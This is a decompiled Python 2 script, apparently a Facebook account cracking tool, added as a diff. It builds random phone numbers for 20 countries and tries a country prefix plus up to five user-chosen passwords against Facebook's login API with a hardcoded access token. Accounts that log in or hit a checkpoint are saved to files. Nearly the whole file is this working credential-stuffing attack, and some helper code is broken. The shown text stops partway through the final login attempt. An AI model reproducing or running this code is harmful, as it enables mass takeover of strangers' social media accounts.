@@ -1,0 +1,629 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: dg
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(3000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('No Module Named Requests! type:pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('No Module Named Mechanize! type:pip2 install mechanize')
+    time.sleep(1)
+    os.system('Then type: python2 speed.py')
+    time.sleep(1)
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def keluar():
+    print '\x1b[1;91m[!] Exit'
+    os.sys.exit()
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+logo = '\n\x1b[1;93m_____ _____ _____  _   _    ___  _________  ___\n\x1b[1;94m|_   _|  ___/  __ \\| | | |  / _ \\ | ___ \\  \\/  |\n\x1b[1;93m  | | | |__ | /  \\/| |_| | / /_\\ \\| |_/ / .  . |\n\x1b[1;94m  | | |  __|| |    |  _  | |  _  || ___ \\ |\\/| |\n\x1b[1;93m  | | | |___| \\__/\\| | | | | | | || |_/ / |  | |\n\x1b[1;94m  \\_/ \\____/ \\____/\\_| |_/ \\_| |_/\\____/\\_|  |_/\n\x1b[1;92m--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 GitHub   : https://github.com/The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 Fb   : https://m.facebook.com/alon3cyber\n\x1b[1;92m--------------------------------------------------\n                                '
+logo2 = '\n\x1b[1;94m                      :::!~!!!!!:.\n\x1b[1;93m                  .xUHWH!! !!?M88WHX:.\n\x1b[1;94m                .X*#M@$!!  !X!M$$$$$$WWx:.\n\x1b[1;93m               :!!!!!!?H! :!$!$$$$$$$$$$8X:\n\x1b[1;94m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:\n\x1b[1;93m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!\n\x1b[1;94m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!\n\x1b[1;93m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!\n\x1b[1;94m               ~?WuxiW*`   `"#$$$$8!!!!??!!!\n\x1b[1;93m             :X- M$$$$       `"T#$T~!8$WUXU~\n\x1b[1;94m            :%`  ~#$$$m:        ~!~ ?$$$$$$\n\x1b[1;93m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"\n\x1b[1;94m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`\n\x1b[1;93mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :\n\x1b[1;94m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`\n\x1b[1;93m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~\n\x1b[1;94m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `\n\x1b[1;93mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!\n\x1b[1;94m$R@i.~~ !     :   ~$$$$$B$$en:``\n\x1b[1;93m?MXT@Wx.~    :     ~"##*$$$$M~\n\x1b[1;92m--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 GitHub   : https://github.com/The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 Fb   : https://m.facebook.com/alon3cyber\n\x1b[1;92m--------------------------------------------------\n                                '
+logo3 = '\n\x1b[1;96m        _______        \x1b[1;93m        _______    \n\x1b[1;96m    .adOOOOOOOOOba.    \x1b[1;93m     .adOOOOOOOOOba.\n\x1b[1;96m   dOOOOOOOOOOOOOOOb   \x1b[1;93m    dOOOOOOOOOOOOOOOb \n\x1b[1;96m  dOOOOOOOOOOOOOOOOOb  \x1b[1;93m   dOOOOOOOOOOOOOOOOOb\n\x1b[1;96m dOOOOOOOOOOOOOOOOOOOb \x1b[1;93m  dOOOOOOOOOOOOOOOOOOOb\n\x1b[1;96m|OOOOOOOOOOOOOOOOOOOOO|\x1b[1;93m |OOOOOOOOOOOOOOOOOOOOO|\n\x1b[1;96mOP\'~"YOOOOOOOOOOOP"~`YO\x1b[1;93m OP\'~"YOOOOOOOOOOOP"~`YO\n\x1b[1;96mOO     `YOOOOOP\'     OO\x1b[1;93m OO     `YOOOOOP\'     OO \n\x1b[1;96mOOb   \xe2\x97\x8f  `OOO\'  \xe2\x97\x8f   dO\x1b[1;93m  OOb   \xe2\x97\x8f  `OOO\'  \xe2\x97\x8f   dO\n\x1b[1;96mYOOo      OOO      oOOP\x1b[1;93m YOOo      OOO      oOOP\n\x1b[1;96m`OOOo     OOO     oOOO\'\x1b[1;93m `OOOo     OOO     oOOO\'\n\x1b[1;96m `OOOb._,dOOOb._,dOOO\' \x1b[1;93m  `OOOb._,dOOOb._,dOOO\'\n\x1b[1;96m  `OOOOOOOOOOOOOOOOO\'  \x1b[1;93m   `OOOOOOOOOOOOOOOOO\'\n\x1b[1;96m   OOOOOOOoOoOOOOOOO   \x1b[1;93m    OOOOOOOoOoOOOOOOO \n\x1b[1;96m   YOOOOOOOOOOOOOOOP   \x1b[1;93m    YOOOOOOOOOOOOOOOP\n\x1b[1;96m   `OOOOOI```IOOOOO\'   \x1b[1;93m    `OOOOOI```IOOOOO\'\n\x1b[1;96m    `OOOOI,,,IOOOO\'    \x1b[1;93m     `OOOOI,,,IOOOO\'   \n\x1b[1;96m     `OOOOOOOOOOO\'     \x1b[1;93m      `OOOOOOOOOOO\'         \n\x1b[1;92m--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 GitHub   : https://github.com/The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 Fb   : https://m.facebook.com/alon3cyber\n\x1b[1;92m--------------------------------------------------\n                                '
+logo4 = "\n\x1b[1;93m                        ____________\n\x1b[1;91m                      .~      ,   . ~.\n\x1b[1;93m                     /                \x1b[1;91m                    /      /~\\/~\\   ,  \x1b[1;93m                   |   .   \\    /   '   |\n\x1b[1;91m                   |         \\/         |\n\x1b[1;93m          XX       |  /~~\\        /~~\\  |       XX\n\x1b[1;91m        XX  X      | |  o  \\    /  o  | |      X  XX\n\x1b[1;93m      XX     X     |  \\____/    \\____/  |     X     XX\n\x1b[1;91m XXXXX     XX      \\         /\\        ,/      XX     XXXXX\n\x1b[1;93mX        XX%;;@      \\      /  \\     ,/      @%%;XX        X\n\x1b[1;93mX       X  @%%;;@     |           '  |     @%%;;@  X       X\n\x1b[1;91mX      X     @%%;;@   |. ` ; ; ; ;  ,|   @%%;;@     X      X\n\x1b[1;93m X    X        @%%;;@                  @%%;;@        X    X\n\x1b[1;91m  X   X          @%%;;@              @%%;;@          X   X\n\x1b[1;93m   X  X            @%%;;@          @%%;;@            X  X\n\x1b[1;91m    XX X             @%%;;@      @%%;;@             X XX\n\x1b[1;93m      XXX              @%%;;@  @%%;;@              XXX\n\x1b[1;91m                         @%%;;%%;;@\n\x1b[1;93m                           @%%;;@\n\x1b[1;91m                         @%%;;@..@@\n\x1b[1;93m                          @@@  @@@\n\x1b[1;92m--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 GitHub   : https://github.com/The-Kgf\n\x1b[1;97m\xe2\x9e\xa3 Fb  : https://m.facebook.com/alon3cyber\n\x1b[1;92m--------------------------------------------------\n                                "
+
+def lisensi():
+    os.system('clear')
+    menu()
+
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\x1b[1;97m--------------------------------------------------\n'
+    print '\x1b[1;93m[01]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m India       \x1b[1;93m[11]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Korea '
+    print '\x1b[1;93m[02]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Pakistan    \x1b[1;93m[12]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Itlay '
+    print '\x1b[1;93m[03]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Bangladesh  \x1b[1;93m[13]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Poland'
+    print '\x1b[1;93m[04]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Afghanistan \x1b[1;93m[14]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Grecee '
+    print '\x1b[1;93m[05]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Indonesia   \x1b[1;93m[15]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Spain'
+    print '\x1b[1;93m[06]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Japan       \x1b[1;93m[16]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Malaysia '
+    print '\x1b[1;93m[07]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Denmark     \x1b[1;93m[17]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Saudia Arabia '
+    print '\x1b[1;93m[08]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m USA         \x1b[1;93m[18]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Iran '
+    print '\x1b[1;93m[09]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m UK          \x1b[1;93m[19]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Germany '
+    print '\x1b[1;93m[10]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m Brazil      \x1b[1;93m[20]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;97m China '
+    print '\n\x1b[1;97m[00]\x1b[1;91m-\xe2\x8b\x84-\x1b[1;92m Exit'
+    print '\x1b[1;97m--------------------------------------------------\n'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    peak = raw_input('\n\x1b[0;98mChoose an Option > \x1b[1;97m')
+    if peak == '':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak == '1':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;97m620,630,700,786,905,954,967,971,990,991,992,993,994,995,996,997,998,999' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+91'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '2':
+        os.system('clear')
+        print logo3
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;97m01,49\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+923'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '3':
+        os.system('clear')
+        print logo4
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;97m175,165,191,192,193,194,195,196,197,198,199' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '4':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;97m20,27,30,31,40,50,58,60' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+930'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '5':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[36, 77, 229, 770, 23, 230, 9' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+62'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '6':
+        os.system('clear')
+        print logo3
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+850'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '7':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m2,3,4,5,6,7,8' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+45'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '0':
+        menu()
+    elif peak == '8':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+1'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '0':
+        menu()
+    elif peak == '9':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+44'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '0':
+        menu()
+    elif peak == '10':
+        os.system('clear')
+        print logo3
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+55'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '11':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+82'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '12':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+39'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '13':
+        os.system('clear')
+        print logo3
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+43'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '14':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m69,693,698,694,695' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+3069'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '15':
+        os.system('clear')
+        print logo3
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+34'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '16':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m11,12,13,14,15,16,17,18,19' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+60'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '17':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m50,51,52,53,54,55,56,57,58' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+966'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '18':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m990,915,901,933,938,902' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+98'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '19':
+        os.system('clear')
+        print logo2
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m151,152,153,155,157,159,160,162,179,163,174,163' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+49'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '20':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92mArea Codes With Network' + '\n'
+        print '\x1b[1;93m1355,1555,1855' + '\n'
+        try:
+            c = raw_input('\x1b[1;92mChoose Area Code : ')
+            k = '+86'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    else:
+        print '[!] Fill In Correctly'
+        mafia()
+    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
+    blacka = raw_input('\x1b[1;93m Type Any Pasword No1 .\x1b[1;97m  ')
+    time.sleep(0.0005)
+    blackb = raw_input('\x1b[1;93m Type Any Pasword No2 .\x1b[1;97m  ')
+    time.sleep(0.0005)
+    blackc = raw_input('\x1b[1;93m Type Any Pasword No3 .\x1b[1;97m  ')
+    time.sleep(0.0005)
+    blackd = raw_input('\x1b[1;93m Type Any Pasword No4 .\x1b[1;97m  ')
+    time.sleep(0.0005)
+    blacke = raw_input('\x1b[1;93m Type Any Pasword No5 .\x1b[1;97m  ')
+    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
+    xxx = str(len(id))
+    print '\x1b[1;96m[\xe2\x9c\x93] Total Numbers: ' + xxx
+    time.sleep(0.5)
+    print '[\x1b[1;96m\xe2\x9c\x93] Trying Passwords Wait...'
+    time.sleep(0.5)
+    print '\x1b[1;96m[!] To Stop Process Press CTRL Then Press z\x1b[1;0m'
+    time.sleep(0.5)
+    print '\x1b[1;97m--------------------------------------------------'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = k
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
+                okb.close()
+                oks.append(k + c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;93m[Kgf_Cp] ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass1 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
+                cps.close()
+                cpb.append(k + c + user + pass1)
+            else:
+                pass2 = blacka
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]\x1b[1;93m  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass2 + '\n' + '\n'
+                    okb = open('save/successfull.txt', 'a')
+                    okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
+                    okb.close()
+                    oks.append(k + c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;93m[Kgf_Cp]\x1b[1;93m ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass2 + '\n'
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(k + c + user + pass2)
+                else:
+                    pass3 = blackb
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]\x1b[1;93m  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass3 + '\n' + '\n'
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
+                        okb.close()
+                        oks.append(k + c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;93m[Kgf_Cp]\x1b[1;93m ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass3 + '\n'
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(k + c + user + pass3)
+                    else:
+                        pass4 = blackc
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]\x1b[1;93m  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass4 + '\n' + '\n'
+                            okb = open('save/successfull.txt', 'a')
+                            okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                            okb.close()
+                            oks.append(k + c + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;93m[Kgf_Cp]\x1b[1;93m ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass4 + '\n'
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                            cps.close()
+                            cpb.append(k + c + user + pass4)
+                        else:
+                            pass5 = blackd
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]\x1b[1;93m  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass5 + '\n' + '\n'
+                                okb = open('save/successfull.txt', 'a')
+                                okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass5 + '\n')
+                                okb.close()
+                                oks.append(k + c + user + pass5)
+                            elif 'www.facebook.com' in q['error_msg']:
+                                print '\x1b[1;93m[Kgf_Cp]\x1b[1;93m ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass5 + '\n'
+                                cps = open('save/checkpoint.txt', 'a')
+                                cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                                cps.close()
+                                cpb.append(k + c + user + pass5)
+                            else:
+                                pass6 = blacke
+                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                q = json.load(data)
+                                if 'access_token' in q:
